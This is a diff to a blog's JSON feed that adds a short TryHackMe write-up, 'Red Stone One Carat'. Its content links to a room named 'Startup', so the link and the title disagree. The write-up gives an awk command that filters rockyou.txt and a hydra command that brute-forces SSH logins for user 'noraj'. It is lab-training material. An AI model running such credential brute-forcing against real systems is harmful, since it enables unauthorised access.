@@ -17,6 +17,30 @@
 "items": [
     
         {
+            "id": "https://beven.co.zw/2021/05/25/red-stone-one-caratthm",
+            "title": "Red Stone One Carat - TryHackMe Room",
+            "summary": null,
+            "content_text": "Room: StartupEnumeration   Start by enumerating the boxPort 22 open  use “noraj” to bruteforce the box# since the hint tells us that the password contains 'bu'awk '/bu/' rockyou.txt &gt; wordlist.txthydra -l noraj -P wordlist.txt ssh://IP -V -F -t 4",
+            "content_html": "<p>Room: <a href=\"https://tryhackme.com/room/startup\">Startup</a></p><h1 id=\"enumeration-\">Enumeration <nmap></nmap></h1><ul>  <li>Start by enumerating the box</li></ul><h1 id=\"port-22-open\">Port 22 open</h1><ul>  <li>use “noraj” to bruteforce the box</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># since the hint tells us that the password contains 'bu'</span><span class=\"nb\">awk</span> <span class=\"s1\">'/bu/'</span> rockyou.txt <span class=\"o\">&gt;</span> wordlist.txthydra <span class=\"nt\">-l</span> noraj <span class=\"nt\">-P</span> wordlist.txt ssh://IP <span class=\"nt\">-V</span> <span class=\"nt\">-F</span> <span class=\"nt\">-t</span> 4</code></pre></div></div>",
+            "url": "https://beven.co.zw/2021/05/25/red-stone-one-caratthm",
+            
+            
+            
+            
+            
+            "date_published": "2021-05-25T00:00:00+02:00",
+            "date_modified": "2021-05-25T00:00:00+02:00",
+            
+                "author":  {
+                "name": "Beven Nyamande",
+                "url": "https://beven.co.zw",
+                "avatar": null
+                }
+                
+            
+        },
+    
+        {
             "id": "https://beven.co.zw/2021/04/21/year-of-jellyfish",
             "title": "Year of the Jellyfish - TryHackMe Room",
             "summary": null,
